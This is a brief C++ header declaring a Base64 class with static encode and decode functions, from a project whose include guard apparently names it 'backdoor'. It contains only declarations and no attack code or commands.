//
// Created by stdout on 2021/4/5.
//

#ifndef BACKDOOR_BASE64_H
#define BACKDOOR_BASE64_H

#include "string.h"
#include "stdlib.h"
#include "stdio.h"

class Base64 {
public:
    static unsigned char *base64_encode(unsigned char *str);

    static unsigned char *bae64_decode(unsigned char *code);

};


#endif //BACKDOOR_BASE64_H
